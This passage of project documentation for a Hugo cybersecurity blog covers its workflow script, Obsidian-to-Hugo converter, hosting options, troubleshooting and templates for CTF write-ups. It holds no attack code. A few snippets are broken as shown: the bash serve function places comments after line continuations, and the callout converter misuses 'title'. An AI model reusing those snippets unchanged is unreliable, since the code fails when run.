- Python packages (pyyaml, frontmatter, PIL)

**When to use**: Troubleshooting, initial setup

**8. Help**
```bash
./scripts/workflow.sh help
```
**Purpose**: Show help message
**Displays**:
- All available commands
- Usage examples
- Workflow description

#### Implementation Details

**Dependency Check** (lines 46-70):
```bash
check_dependencies() {
    # Check Python
    if ! command -v python3 &> /dev/null; then
        print_error "Python 3 is not installed"
        exit 1
    fi

    # Check Hugo
    if ! command -v hugo &> /dev/null; then
        print_warning "Hugo is not installed. Install from https://gohugo.io/"
        exit 1
    fi

    # Check Python packages
    python3 -c "import yaml, frontmatter, PIL" 2>/dev/null || {
        print_error "Missing required Python packages. Installing..."
        pip3 install pyyaml python-frontmatter Pillow
    }
}
```

**Serve Command** (lines 105-115):
```bash
serve_site() {
    hugo server \
        --config hugo.toml,config-development.toml \  # Use dev config
        --buildDrafts \                                # Include drafts
        --buildExpired \                               # Include expired
        --buildFuture \                                # Include future posts
        --disableFastRender \                          # Full rebuild
        --bind 0.0.0.0 \                               # Network access
        --port 1313                                    # Port
}
```

**Watch Mode** (lines 132-157):
```bash
watch_mode() {
    # Use inotifywait if available
    if command -v inotifywait &> /dev/null; then
        inotifywait -m -r -e modify,create,move \
            --format '%w%f %e' obsidian-vault/posts/ |
        while read file event; do
            if [[ "$file" == *.md ]]; then
                convert_notes
            fi
        done
    else
        # Fallback to polling
        while true; do
            convert_notes
            sleep 5
        done
    fi
}
```

#### Color Output

Script uses color-coded messages:

```bash
RED='\033[0;31m'      # Errors
GREEN='\033[0;32m'    # Success
YELLOW='\033[1;33m'   # Warnings
BLUE='\033[0;34m'     # Info
CYAN='\033[0;36m'     # Headers
NC='\033[0m'          # No Color

print_error()   { echo -e "${RED}[ERROR]${NC} $1"; }
print_success(){ echo -e "${GREEN}[SUCCESS]${NC} $1"; }
print_warning(){ echo -e "${YELLOW}[WARNING]${NC} $1"; }
print_status()  { echo -e "${BLUE}[INFO]${NC} $1"; }
print_header()  { echo -e "${CYAN}========================================${NC}"; }
```

### obsidian_to_hugo_converter.py - Python Converter

#### Purpose
Convert Obsidian-flavored markdown to Hugo-compatible format with automated processing.

#### Location
`/home/hrithik/gemini/Hri7hik_H4cks/scripts/obsidian_to_hugo_converter.py`

#### Features
- YAML configuration loading
- Obsidian syntax conversion
- Image processing and optimization
- Front matter generation
- Auto-extraction of metadata
- Error handling and logging

#### Core Classes

**ObsidianToHugoConverter** (lines 21-107):
```python
class ObsidianToHugoConverter:
    def __init__(self, config_path: str = "scripts/config.yaml"):
        self.config = self.load_config(config_path)
        self.processed_images = set()
```

#### Key Methods

**1. Load Configuration** (lines 29-51):
```python
def load_config(self, config_path: str) -> Dict:
    default_config = {
        "obsidian_vault": "./obsidian-vault",
        "hugo_content": "./content/posts",
        "auto_copy_images": True,
        "optimize_images": True,
        "image_max_width": 1200,
        "create_missing_frontmatter": True,
        ...
    }

    if os.path.exists(config_path):
        with open(config_path, 'r') as f:
            user_config = yaml.safe_load(f)
            default_config.update(user_config)

    return default_config
```

**2. Process File** (lines 53-74):
```python
def process_file(self, obsidian_file: Path, output_file: Path) -> None:
    # Read Obsidian markdown
    with open(obsidian_file, 'r', encoding='utf-8') as f:
        content = f.read()

    # Handle front matter
    content, front_matter = self.extract_and_process_frontmatter(
        content, obsidian_file
    )

    # Convert syntax
    content = self.convert_wikilinks_to_links(content)
    content = self.convert_callouts(content)
    content = self.add_copy_buttons_to_codeblocks(content)

    # Process images
    content = self.process_images_in_content(content, obsidian_file.parent)

    # Write result
    self.write_converted_file(output_file, content, front_matter)
```

**3. Convert WikiLinks**:
```python
def convert_wikilinks_to_links(self, content: str) -> str:
    # [[Wiki Link]] → [Wiki Link](/wiki-link/)
    pattern = r'\[\[([^\]]+)\]\]'
    def replace_wikilink(match):
        text = match.group(1)
        # Clean and format as URL
        url = text.lower().replace(' ', '-')
        return f'[{text}](/{url}/)'
    return re.sub(pattern, replace_wikilink, content)
```

**4. Convert Callouts**:
```python
def convert_callouts(self, content: str) -> str:
    # > [!type] Title → <div class="callout callout-type">
    pattern = r'> \[!([^\]]+)\]\s*(?:([^\n]+)\n)?'
    def replace_callout(match):
        callout_type = match.group(1).lower()
        title = match.group(2) or title(callout_type)
        return f'<div class="callout callout-{callout_type}">\n'
    return re.sub(pattern, replace_callout, content)
```

**5. Process Images**:
```python
def process_images_in_content(self, content: str, source_dir: Path) -> str:
    pattern = r'!\[([^\]]*)\]\(([^)]+)\)'

    def replace_image(match):
        alt_text = match.group(1)
        image_path = match.group(2)

        # Copy and optimize image
        # Update reference to new location
        # Return new markdown

    return re.sub(pattern, replace_image, content)
```

**6. Generate Front Matter**:
```python
def generate_frontmatter(self, file_path: Path, existing: Dict) -> Dict:
    front_matter = existing.copy() if existing else {}

    # Auto-generate missing fields
    if "title" not in front_matter:
        front_matter["title"] = self.generate_title_from_filename(file_path)

    if "date" not in front_matter:
        front_matter["date"] = datetime.now().isoformat()

    # Auto-extract metadata
    if self.config.get("auto_extract_tools", True):
        # Extract tools from content
        pass

    if self.config.get("auto_extract_platforms", True):
        # Extract platforms
        pass

    if self.config.get("auto_extract_difficulty", True):
        # Extract difficulty
        pass

    return front_matter
```

#### Converter Configuration

**config.yaml** settings:
```yaml
# Source and destination paths
obsidian_vault: "./obsidian-vault"
hugo_content: "./content/posts"
hugo_static: "./static/images"

# Image handling
auto_copy_images: true              # Copy images automatically
optimize_images: true               # Optimize images
image_max_width: 1200               # Max width in pixels
image_quality: 85                   # JPEG quality (1-100)
image_storage_strategy: "by-post"   # Storage method

# Front matter generation
create_missing_frontmatter: true    # Create if missing
default_draft: false                # Default draft status
default_categories: ["General"]     # Default categories

# Auto-extraction
auto_extract_tools: true            # Extract tools from content
auto_extract_platforms: true        # Extract platforms
auto_extract_difficulty: true       # Extract difficulty
generate_description: true          # Generate description
title_case: true                    # Title case conversion

# Filename to title conversion
auto_generate_title: true           # Auto-generate title from filename

# Watch mode settings
watch_interval: 5                   # Polling interval in seconds

# Logging
log_level: "INFO"                   # Logging level
verbose: true                       # Verbose output
```

#### Auto-Extraction

**Tools Detection** (config.yaml `auto_extract_tools: true`):
- Scans content for tool names
- Matches against known security tools
- Adds to front matter `tools: []`

**Platforms Detection** (config.yaml `auto_extract_platforms: true`):
- Identifies platform mentions
- Maps to standard platform names
- Adds to front matter `platforms: []`

**Difficulty Detection** (config.yaml `auto_extract_difficulty: true`):
- Analyzes content for difficulty indicators
- Keywords like "beginner", "easy", "basic"
- Sets `difficulties: []` in front matter

**Example Detection:**
```yaml
# Input content
# This is a beginner-friendly guide using nmap and HackTheBox...

# Output front matter (auto-generated)
---
title: "Guide Title"
date: 2025-11-02T...
difficulties: ["beginner"]
platforms: ["HackTheBox"]
tools: ["nmap"]
---
```

#### Command Line Interface

**Basic usage:**
```bash
python3 scripts/obsidian_to_hugo_converter.py
```

**Custom source/output:**
```bash
python3 scripts/obsidian_to_hugo_converter.py \
    --source ./my-vault \
    --output ./content

python3 scripts/obsidian_to_hugo_converter.py \
    --config ./custom-config.yaml

python3 scripts/obsidian_to_hugo_converter.py --verbose
```

**Arguments supported:**
- `--source`: Obsidian vault path (default: ./obsidian-vault)
- `--output`: Hugo content path (default: ./content/posts)
- `--config`: Custom config file path
- `--verbose`: Enable verbose output
- `--help`: Show help message

### config.yaml - Converter Configuration

#### Location
`/home/hrithik/gemini/Hri7hik_H4cks/scripts/config.yaml`

#### Purpose
Centralized configuration for Python converter, allowing customization without editing Python code.

#### Configuration Sections

**1. Path Configuration:**
```yaml
obsidian_vault: "./obsidian-vault"    # Source directory
hugo_content: "./content/posts"      # Output directory
hugo_static: "./static/images"       # Image storage
obsidian_attachments_folder: "attachments"  # Images folder in vault
```

**2. Image Handling:**
```yaml
auto_copy_images: true       # Auto-copy images to Hugo
optimize_images: true        # Optimize images
image_max_width: 1200        # Max width in pixels
image_quality: 85            # JPEG quality (1-100)
image_storage_strategy: "by-post"  # Storage method:
                                   # - "by-post": Create post-specific folders
                                   # - "by-type": Group by type
                                   # - "flat": All in one folder
```

**3. Front Matter:**
```yaml
create_missing_frontmatter: true  # Generate missing front matter
default_draft: false              # Default draft status
default_categories: ["General"]   # Default categories for new posts
default_difficulties: ["beginner"] # Default difficulty
default_platforms: ["General"]    # Default platform
default_tools: []                 # Default tools
generate_description: true        # Auto-generate description
title_case: true                  # Title case for auto-generated titles
```

**4. Auto-Extraction:**
```yaml
auto_extract_tools: true       # Auto-detect tools from content
auto_extract_platforms: true   # Auto-detect platforms
auto_extract_difficulty: true  # Auto-detect difficulty
```

**5. Filename Processing:**
```yaml
auto_generate_title: true      # Generate title from filename
                                # my-post.md → "My Post"

title_case: true               # Apply title case:
                                # "my post" → "My Post"
```

**6. Watch Mode:**
```yaml
watch_interval: 5  # Seconds between polls (polling mode)
```

**7. Logging:**
```yaml
log_level: "INFO"  # Options: DEBUG, INFO, WARNING, ERROR
verbose: true      # Enable verbose output
```

#### Custom Configuration

Create a custom configuration file:

```bash
# Copy the default config
cp scripts/config.yaml my-custom-config.yaml

# Edit it
vim my-custom-config.yaml

# Use it
python3 scripts/obsidian_to_hugo_converter.py --config my-custom-config.yaml
```

**Example: Disable Auto-Extraction**
```yaml
# my-config.yaml
auto_extract_tools: false
auto_extract_platforms: false
auto_extract_difficulty: false

optimize_images: false  # Skip image optimization for speed
```

**Example: Custom Paths**
```yaml
# my-config.yaml
obsidian_vault: "./my-notes"
hugo_content: "./content"
hugo_static: "./static/images"

image_storage_strategy: "flat"  # All images in one folder
```

---

## 10. Deployment

### Building for Production

#### Standard Build

```bash
# Build production site
./scripts/workflow.sh build

# Output location
public/  # Static files ready for deployment
```

**Build Command Details:**
```bash
hugo \
  --minify \                      # Minify HTML, CSS, JS
  --buildExpired \                # Include expired posts
  --buildFuture                   # Include future posts
```

**What's Included:**
- All HTML pages (index, posts, taxonomies)
- Minified CSS (from assets/css/custom.css)
- JavaScript (copy-buttons.js)
- Optimized images (from static/images/)
- Sitemap (sitemap.xml)
- RSS feed (index.xml)
- 404 page

**What's Not Included:**
- Source files (content/, archetypes/, etc.)
- Hugo configuration files
- Scripts
- Templates
- Development files

#### Manual Build Options

```bash
# Using main config (production URLs)
hugo --minify

# Quiet mode (less output)
hugo --quiet --minify

# Specific config
hugo --config hugo.toml --minify

# Check build
ls -lah public/posts/
```

#### Build Verification

```bash
# Build site
./scripts/workflow.sh build

# Verify pages generated
ls -lah public/posts/ | head -20

# Check sitemap
cat public/sitemap.xml | grep -E '<url>|<loc>'

# Verify images
ls -lah public/images/

# Check site size
du -sh public/
```

### Hosting Options

#### 1. Netlify

**Setup:**
1. Push to GitHub/GitLab
2. Connect Netlify to your repository
3. Configure build settings:
   - **Build command**: `./scripts/workflow.sh build`
   - **Publish directory**: `public`
4. Deploy

**netlify.toml:**
```toml
[build]
  publish = "public"
  command = "./scripts/workflow.sh build"

[build.environment]
  HUGO_VERSION = "0.152.2"
  PYTHON_VERSION = "3.11"

[[redirects]]
  from = "/*"
  to = "/index.html"
  status = 200
```

**Advantages:**
- Automatic deployments on git push
- Branch previews
- Form handling
- CDN included
- Free tier available

#### 2. Vercel

**Setup:**
1. Install Vercel CLI: `npm i -g vercel`
2. Run in project directory: `vercel`
3. Configure:
   - Framework: Hugo
   - Build command: `./scripts/workflow.sh build`
   - Output directory: `public`
4. Deploy

**vercel.json:**
```json
{
  "version": 2,
  "builds": [
    {
      "src": "scripts/workflow.sh",
      "use": "@vercel/static-build",
      "config": {
        "distDir": "public"
      }
    }
  ],
  "routes": [
    {
      "src": "/(.*)",
      "dest": "/public/$1"
    }
  ]
}
```

**Advantages:**
- Edge network
- Automatic HTTPS
- Branch previews
- Git integration
- Free tier

#### 3. GitHub Pages

**Setup:**

**.github/workflows/deploy.yml:**
```yaml
name: Deploy Hugo Site

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
        with:
          submodules: recursive

      - name: Setup Hugo
        uses: peaceiris/actions-hugo@v2
        with:
          hugo-version: '0.152.2'

      - name: Setup Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.11'

      - name: Install dependencies
        run: |
          pip3 install -r requirements.txt

      - name: Build
        run: ./scripts/workflow.sh build

      - name: Deploy
        uses: peaceiris/actions-gh-pages@v3
        with:
          github_token: ${{ secrets.GITHUB_TOKEN }}
          publish_dir: ./public
```

**Advantages:**
- Free for public repos
- Integrated with GitHub
- Custom domains
- HTTPS included

#### 4. Cloudflare Pages

**Setup:**
1. Push to Git repository
2. Connect Cloudflare Pages
3. Configure:
   - **Framework preset**: Hugo
   - **Build command**: `./scripts/workflow.sh build`
   - **Build output directory**: `public`
4. Deploy

**Advantages:**
- Global CDN
- Excellent performance
- Free tier
- Easy setup

#### 5. Self-Hosted (VPS)

**Using Nginx:**

**1. Build site:**
```bash
./scripts/workflow.sh build
```

**2. Upload to server:**
```bash
rsync -avz public/ user@your-server:/var/www/yourdomain.com/
```

**3. Nginx configuration (`/etc/nginx/sites-available/yourdomain.com`):**
```nginx
server {
    listen 80;
    server_name yourdomain.com www.yourdomain.com;
    root /var/www/yourdomain.com;
    index index.html;

    location / {
        try_files $uri $uri/ /index.html;
    }

    # Enable gzip compression
    gzip on;
    gzip_types text/plain text/css application/json application/javascript text/xml application/xml text/javascript;
}
```

**4. Enable site:**
```bash
sudo ln -s /etc/nginx/sites-available/yourdomain.com /etc/nginx/sites-enabled/
sudo nginx -t
sudo systemctl reload nginx
```

**Advantages:**
- Full control
- Custom configurations
- No platform restrictions
- Can use your own domain

#### 6. Firebase Hosting

**Setup:**

**firebase.json:**
```json
{
  "hosting": {
    "public": "public",
    "ignore": [
      "firebase.json",
      "**/.*",
      "**/node_modules/**"
    ],
    "rewrites": [
      {
        "source": "**",
        "destination": "/index.html"
      }
    ]
  }
}
```

**Deploy:**
```bash
npm install -g firebase-tools
firebase login
firebase init hosting
firebase deploy
```

**Advantages:**
- Google infrastructure
- Fast global CDN
- Easy CLI deployment
- Free tier

### CI/CD Recommendations

#### Continuous Deployment

**GitHub Actions** (recommended):
```yaml
name: Build and Deploy

on:
  push:
    branches: [ main ]

jobs:
  build-deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
        with:
          submodules: recursive

      - name: Setup Hugo
        uses: peaceiris/actions-hugo@v2
        with:
          hugo-version: '0.152.2'

      - name: Setup Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.11'

      - name: Install dependencies
        run: pip3 install -r requirements.txt

      - name: Build site
        run: ./scripts/workflow.sh build

      - name: Deploy
        # Deploy to your chosen platform
```

#### Branch Previews

**Netlify:**
- Auto-creates preview for each PR
- URL: `https://deploy-preview-123--yoursite.netlify.app`

**Vercel:**
- Auto-creates preview for each PR
- URL: `https://yoursite-git-branch-username.vercel.app`

#### Environment-Specific Builds

**Production:**
```bash
hugo --config hugo.toml --minify
```

**Staging:**
```bash
hugo --config hugo.toml,config-development.toml --minify
```

### Domain Configuration

#### Custom Domain Setup

**1. Update hugo.toml:**
```toml
baseURL = 'https://yourdomain.com/'
```

**2. DNS Configuration:**
```
Type: A
Name: @
Value: [Your hosting provider's IP]

Type: CNAME
Name: www
Value: yourdomain.com
```

**3. Enable HTTPS:**
- **Netlify**: Automatic with Let's Encrypt
- **Vercel**: Automatic
- **Cloudflare**: Free SSL/TLS
- **GitHub Pages**: Automatic for github.io domains, manual for custom domains

#### WWW Redirect

**Netlify (netlify.toml):**
```toml
[[redirects]]
  from = "https://www.yourdomain.com/*"
  to = "https://yourdomain.com/:splat"
  status = 301
  force = true
```

**Cloudflare (Page Rules):**
```
yourdomain.com/* → yourdomain.com/$1 (301 Redirect)
www.yourdomain.com/* → yourdomain.com/$1 (301 Redirect)
```

### Performance Optimization

#### Build Optimizations

**Minification:**
```bash
hugo --minify  # Already in workflow.sh
```

**Image Optimization:**
```yaml
# config.yaml
optimize_images: true
image_max_width: 1200
image_quality: 85
```

**CSS/JS Bundling:**
- Hugo automatically bundles assets
- Custom CSS is minified
- JavaScript is minified

#### CDN Configuration

**Cloudflare:**
1. Add site to Cloudflare
2. Change nameservers
3. Enable caching:
   - Cache Level: Standard
   - Browser Cache TTL: 4 hours
   - Edge Cache TTL: 1 month

**Speed Tips:**
- Optimize images before upload
- Use WebP format when possible
- Minimize number of images
- Enable compression on server

### Deployment Checklist

**Pre-Deployment:**
- [ ] Test locally with `./scripts/workflow.sh serve`
- [ ] Build with `./scripts/workflow.sh build`
- [ ] Check all links work
- [ ] Verify images load
- [ ] Test on mobile devices
- [ ] Check for broken links
- [ ] Validate HTML/CSS
- [ ] Review SEO metadata
- [ ] Check accessibility
- [ ] Test dark/light theme

**During Deployment:**
- [ ] Choose hosting platform
- [ ] Configure build settings
- [ ] Set up CI/CD
- [ ] Configure custom domain
- [ ] Enable HTTPS
- [ ] Set up redirects

**Post-Deployment:**
- [ ] Verify site loads
- [ ] Test all pages
- [ ] Check search functionality
- [ ] Submit sitemap to Google Search Console
- [ ] Verify analytics tracking
- [ ] Test performance
- [ ] Set up monitoring

---

## 11. Troubleshooting

### Common Issues & Solutions

#### Issue 1: Posts Not Appearing

**Symptoms:**
- New posts don't show on site
- Posts visible in `content/posts/` but not in build

**Diagnosis:**
```bash
# Check if posts are in correct location
ls -lah content/posts/*.md

# Check if Hugo sees them
hugo list all | grep "post-name"

# Check dates
grep "^date:" content/posts/post-name.md
```

**Solutions:**

**1. Future Date Issue:**
```bash
# Posts with future dates won't appear in production
# Edit front matter and set date to past

# Before:
date: 2025-12-01  # Future

# After:
date: 2025-11-02  # Present/past
```

**2. Draft Status:**
```yaml
# Posts with draft: true won't appear
---
draft: false  # Change to false
---
```

**3. Directory Structure Issue:**
```bash
# Check for double-nested directories
ls -la content/posts/posts/  # Wrong!

# Should be:
ls -la content/posts/*.md    # Correct
```

**4. Use Build Flags:**
```bash
# Include all posts in build
hugo --buildDrafts --buildExpired --buildFuture
```

#### Issue 2: localhost URLs in Production

**Symptoms:**
- Links on production site point to localhost:1313
- Internal links broken

**Diagnosis:**
```bash
# Check baseURL in hugo.toml
grep "baseURL" hugo.toml
```

**Solution:**
```toml
# hugo.toml (production)
baseURL = 'https://yourdomain.com/'

# NOT localhost
```

**For Development:**
```bash
# Use development config
hugo server --config hugo.toml,config-development.toml
```

#### Issue 3: Images Not Loading

**Symptoms:**
- Images don't display on site
- 404 errors for images

**Diagnosis:**
```bash
# Check image locations
ls -lah static/images/

# Check markdown references
grep "!\[" content/posts/post-name.md
```

**Solutions:**

**1. Image Path Issue:**
```markdown
# Wrong:
![Image](images/pic.jpg)

# Correct (in Hugo):
![Image](/images/pic.jpg)
```

**2. Copy Images to Static:**
```bash
# Manually copy images
cp obsidian-vault/attachments/* static/images/

# Or use converter
./scripts/workflow.sh convert
```

**3. Image Format Issues:**
```bash
# Convert to web-friendly format
convert image.png -resize 1200x -quality 85 static/images/image.jpg
```

#### Issue 4: Build Errors

**Symptoms:**
- Hugo build fails
- Error messages during build

**Common Errors:**

**1. Front Matter YAML Syntax:**
```yaml
# Wrong:
title: "My Post
date: 2025-11-02

# Correct:
title: "My Post"
date: 2025-11-02
```

**2. Missing Closing Bracket:**
```yaml
tags: ["nmap", "burp"  # Missing ]
# Should be:
tags: ["nmap", "burp"]
```

**3. Invalid Date Format:**
```yaml
# Wrong:
date: 2025/11/02

# Correct:
date: 2025-11-02
```

**Debug Build:**
```bash
# Verbose output
hugo --verbose

# Check specific page
hugo --quiet --renderToMemory
```

#### Issue 5: Shortcodes Not Working

**Symptoms:**
- Shortcode code displays as text
- Shortcodes don't render

**Diagnosis:**
```bash
# Check if shortcode file exists
ls -lah layouts/shortcodes/

# Check syntax
cat layouts/shortcodes/tool.html
```

**Solutions:**

**1. Shortcode Syntax:**
```markdown
<!-- Wrong -->
{{tool tool="nmap"}}

<!-- Correct -->
{{< tool tool="nmap" />}}
```

**2. Restart Hugo Server:**
```bash
# Shortcodes require restart
Ctrl+C
hugo server -D
```

**3. Check Inner Content:**
```markdown
<!-- Shortcodes with content need closing tag -->
{{< callout type="info" >}}Content here{{< /callout >}}

<!-- NOT -->
{{< callout type="info" >}}Content here
```

#### Issue 6: Obsidian Conversion Fails

**Symptoms:**
- Conversion errors
- Python converter crashes

**Diagnosis:**
```bash
# Run converter with verbose
python3 scripts/obsidian_to_hugo_converter.py --verbose

# Check Python packages
pip3 list | grep -E "pyyaml|frontmatter|Pillow"
```

**Solutions:**

**1. Missing Dependencies:**
```bash
pip3 install -r requirements.txt
```

**2. Invalid YAML:**
```yaml
# Check obsidian-vault/posts/*.md for YAML errors
# Use YAML validator
```

**3. File Permissions:**
```bash
chmod +x scripts/workflow.sh
chmod +x scripts/obsidian_to_hugo_converter.py
```

**4. Check Config:**
```bash
# Validate config.yaml
python3 -c "import yaml; yaml.safe_load(open('scripts/config.yaml'))"
```

#### Issue 7: Hugo Server Won't Start

**Symptoms:**
- Port 1313 already in use
- Permission errors
- Theme not found

**Diagnosis:**
```bash
# Check if Hugo is installed
hugo version

# Check if port is in use
lsof -i :1313

# Check theme
ls -lah themes/PaperMod/
```

**Solutions:**

**1. Port in Use:**
```bash
# Kill process using port
kill -9 $(lsof -ti:1313)

# Or use different port
hugo server --port 1314
```

**2. Theme Not Found:**
```bash
# Initialize submodules
git submodule update --init --recursive

# Or install theme
git clone https://github.com/adityatelange/hugo-PaperMod.git themes/PaperMod
```

**3. Permission Denied:**
```bash
# Run with sudo (if needed)
sudo hugo server
```

#### Issue 8: CSS Not Loading

**Symptoms:**
- Site appears unstyled
- Custom CSS not applied

**Diagnosis:**
```bash
# Check CSS file exists
ls -lah assets/css/custom.css

# Check hugo.toml references
grep "customCSS" hugo.toml
```

**Solutions:**

**1. CSS Path Issue:**
```toml
# hugo.toml
[params]
  customCSS = ["css/custom.css"]
```

**2. CSS Syntax Errors:**
```bash
# Validate CSS
css-validator assets/css/custom.css
```

**3. Build CSS:**
```bash
# Hugo should auto-build
hugo --minify
```

### Debugging Commands

#### Hugo Diagnostics

```bash
# List all pages Hugo recognizes
hugo list all

# Check page counts
hugo list drafts
hugo list expired
hugo list future

# Print configuration
hugo --printStats

# Check templates
hugo --templateMetrics

# Analyze site
hugo --gc --printStats
```

#### Check Links

```bash
# Check for broken internal links
hugo --printStats | grep "404"

# Or use link checker
pip3 install linkchecker
linkchecker http://localhost:1313
```

#### Validate HTML

```bash
# Install validator
npm install -g html-validator

# Validate built site
html-validator public/index.html
```

#### Check Images

```bash
# Find broken image references
grep -r "!\[.*\](" content/posts/ | grep -v "/images/"

# Check image files
find public/images/ -type f
```

#### Validate CSS

```bash
# Install CSS validator
npm install -g css-validator

# Validate custom CSS
css-validator assets/css/custom.css
```

### Known Bugs & Fixes

#### Bug 1: Double-Nested Directory Path

**Status:** ✅ FIXED

**Problem:**
Converter created `content/posts/posts/` instead of `content/posts/`

**Fix Applied:**
Modified `scripts/obsidian_to_hugo_converter.py` lines 361-379:
```python
# Remove 'posts' subdirectory from path if it exists
if len(rel_path.parts) > 0 and rel_path.parts[0] == 'posts':
    rel_path = Path(*rel_path.parts[1:])
```

**Prevention:**
- Always check post locations after conversion
- Use `ls -lah content/posts/*.md`

#### Bug 2: Future Posts Not in Production Build

**Status:** ✅ FIXED

**Problem:**
Hugo excludes future-dated posts in production builds

**Fix Applied:**
Modified `scripts/workflow.sh` line 121:
```bash
# Added flags to production build
hugo --minify --buildExpired --buildFuture
```

**Prevention:**
- Always set realistic publish dates
- Check date format: `YYYY-MM-DDTHH:MM:SSZ`

#### Bug 3: Missing localhost URLs in Dev Mode

**Status:** ✅ FIXED

**Problem:**
Links redirected to production domain in dev mode

**Fix Applied:**
Created `config-development.toml` with localhost baseURL
Updated `scripts/workflow.sh` to use dev config

**Prevention:**
- Always use `./scripts/workflow.sh serve` for development
- Don't edit hugo.toml for local development

### Performance Issues

#### Slow Build Times

**Diagnosis:**
```bash
hugo --printStats
```

**Solutions:**
1. **Optimize images:** `optimize_images: true` in config.yaml
2. **Disable drafts:** Don't build drafts in production
3. **Cache:** Use `--disableFastRender` for development only
4. **Hardware:** Use SSD, more RAM

#### Large Site Size

**Check site size:**
```bash
du -sh public/

# Breakdown
find public/ -type f -exec ls -lah {} \; | awk '{print $5 "\t" $9}' | sort -hr
```

**Optimize:**
1. **Compress images:** Lower quality, resize
2. **Remove unused CSS/JS:** Purge CSS
3. **Minify:** Already enabled with `--minify`
4. **CDN:** Use Cloudflare for caching

### Getting Help

#### Check Documentation

1. **Hugo Docs**: https://gohugo.io/documentation/
2. **PaperMod Theme**: https://github.com/adityatelange/hugo-PaperMod
3. **Project Docs**: Check markdown files in repo

#### Enable Debug Logging

```bash
# Hugo verbose
hugo --verbose

# Python converter verbose
python3 scripts/obsidian_to_hugo_converter.py --verbose

# In config.yaml
log_level: "DEBUG"
verbose: true
```

#### Common Log Messages

**Hugo:**
- `WARN` - Warnings (usually safe to ignore)
- `ERROR` - Errors (need fixing)
- `INFO` - Information

**Python Converter:**
- `Converted: file.md → output.md` - Success
- `ERROR: Invalid YAML` - Fix front matter
- `WARNING: No images found` - Check image paths

---

## 12. Best Practices

### Content Creation

#### Writing CTF Walkthroughs

**Structure:**
```markdown
# Machine Name - Walkthrough

> [!info] Information
> **Platform:** HackTheBox
> **Difficulty:** Beginner
> **IP:** 10.10.10.10
> **Objective:** Get root flag

## Table of Contents
- [Reconnaissance](#reconnaissance)
- [Initial Access](#initial-access)
- [Privilege Escalation](#privilege-escalation)
- [Flag Finding](#flag-finding)

## Reconnaissance
> [!tip] Tip
> Start with a comprehensive port scan.

```bash
nmap -sC -sV -oA scan 10.10.10.10
```

## Initial Access

## Privilege Escalation

## Flag Finding
> [!success] Success!
> `HTB{flag_value}`

## Summary
### Tools Used
- {{< tool tool="nmap" />}}
- {{< tool tool="gobuster" />}}
- {{< tool tool="metasploit" />}}

### What We Learned
1. Lesson 1
2. Lesson 2
```

**Best Practices:**
- Start each section with what you'll do
- Include command output (don't just list commands)
- Use callouts for tips, warnings, important info
- Add a tools used section
- Summarize key takeaways
- Keep it beginner-friendly if marked beginner

#### Writing Tutorials

**Structure:**
```markdown
# Tutorial Title

## Prerequisites
- Knowledge of X
- Tools: {{< tool tool="tool1" />}}, {{< tool tool="tool2" >}}

## Learning Objectives
By the end of this tutorial, you'll know:
- Objective 1
- Objective 2

## Step-by-Step Guide

### Step 1: Setup
Instructions...

### Step 2: Execute
Commands...

### Step 3: Verify
Check results...

## Conclusion
Summary...

## Additional Resources
- Link 1
- Link 2
```

**Best Practices:**
- Clear learning objectives
- Prerequisites listed
- Step-by-step instructions
- Screenshots for visual learners
- Verification steps
- Further reading/resources

#### Security Analysis Posts

**Structure:**
```markdown
# Vulnerability Analysis: CVE-XXXX-YYYY

## Executive Summary
Brief overview of vulnerability

## Technical Details
- CVE ID
- CVSS Score
- Affected Software
- Vulnerability Type

## Proof of Concept
Code/exploit

## Impact Assessment
What can happen

## Mitigation
How to fix/protect

## References
CVE database, security advisories
```

### Front Matter Best Practices

#### Use All Relevant Fields

**Complete Front Matter:**
```yaml
---
title: "Descriptive Title"
date: 2025-11-02T10:30:00Z
draft: false
categories: ["CTF", "Walkthrough"]
tags: ["web", "sqli", "owasp-top-10"]
difficulties: ["beginner"]
platforms: ["HackTheBox"]
tools: ["nmap", "burp suite", "sqlmap"]
description: "Learn how to exploit SQL injection vulnerabilities through detailed walkthrough."
---
```

#### Date Format

**Use ISO 8601 format:**
```yaml
date: 2025-11-02T10:30:00Z

# NOT
date: 11/2/2025          # Ambiguous
date: "Nov 2, 2025"      # Non-standard
```

#### Description Field

**SEO-Friendly:**
- 150-160 characters
- Compelling summary
- Include primary keyword
- No markdown formatting

```yaml
description: "Complete walkthrough of HackTheBox Lame machine. Learn nmap enumeration, Samba exploitation, and privilege escalation techniques."
```

#### Consistent Taxonomy Usage

**Standard Values:**
```yaml
categories: ["CTF", "Tutorial", "Analysis", "Walkthrough", "General"]

difficulties: ["beginner", "intermediate", "advanced"]

platforms: ["HackTheBox", "TryHackMe", "picoCTF", "VulnHub", "General"]

tools: ["nmap", "burp suite", "metasploit", "sqlmap", "hashcat", "john"]
```

**Keep it simple:** Don't create new categories/platforms without reason

### Security Best Practices

#### Don't Reveal Production Details

**In Posts:**
```markdown
# Wrong
Target: 10.10.10.10 (production server)
Password: password123
Config file: /etc/production/config.yml

# Correct
Target: 10.10.10.10 (lab environment)
Use test credentials
Reference: /etc/config.yml (sample)
```

#### Use Placeholder Flags

```markdown
# Instead of real flags
> [!success] Flag
> `HTB{real_flag_value}`

# Use placeholder
> [!success] Flag
> `HTB{flag_placeholder}`
```

#### Sanitize Output

```bash
# Remove sensitive data from output
# Before
user:admin password:supersecret123
# After
user:admin password:********
```

#### General Security

- Use lab environments (not production)
- Don't share API keys or credentials
- Redact personal information
- Use generic/sanitized examples

### SEO Best Practices

#### Title Optimization

```yaml
# Good: Descriptive, keyword-rich
title: "HackTheBox Lame Walkthrough - SMB Exploitation Guide"

# Bad: Vague
title: "Lame Walkthrough"
```

#### Description Optimization

```yaml
description: "Complete step-by-step walkthrough of HackTheBox Lame machine. Learn SMB enumeration, vulnerability exploitation, and privilege escalation."
```
- 150-160 characters
- Include target keyword
- Compelling call-to-action
- No special characters

#### URL Structure

```markdown
# File name
hack-the-box-lame-walkthrough.md

# URL
/Posts/hack-the-box-lame-walkthrough/
```

**Rules:**
- Lowercase
- Hyphens for spaces
- Descriptive
- Include primary keyword
- Keep short (50-60 chars)

#### Internal Linking

```markdown
# In posts
For more nmap techniques, see my [Nmap Command Reference](/posts/nmap-command-reference/).

# Related posts section
## Related Posts
- [HackTheBox Blue Walkthrough](/posts/hack-the-box-blue-walkthrough/)
